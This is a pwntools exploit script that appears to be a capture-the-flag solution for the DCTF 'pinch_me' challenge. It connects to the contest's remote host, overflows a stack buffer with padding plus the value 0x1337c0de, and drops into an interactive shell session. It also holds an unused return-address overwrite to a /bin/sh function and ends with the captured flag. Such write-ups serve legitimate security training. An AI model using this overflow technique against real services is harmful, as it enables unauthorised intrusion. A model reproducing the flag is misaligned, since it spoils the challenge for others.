from pwn import *

io = remote('dctf1-chall-pinch-me.westeurope.azurecontainer.io', 7480)

filename = './pinch_me'
elf = context.binary = ELF(filename)

# io = process(elf.path)
log.info(io.recvline())

padding = b"A"*40 #overwrite eip and reach bin/sh
bin_sh = p64(0x004011a1) #we could directly supply the address of the bin/sh function

padding2 = b"A"*24
# we could also supply the argument 0x1337c0de to
leet = p64(0x1337c0de)
exploit = padding2 + leet

io.sendline(exploit)
io.interactive()

#dctf{y0u_kn0w_wh4t_15_h4pp3n1ng_b75?}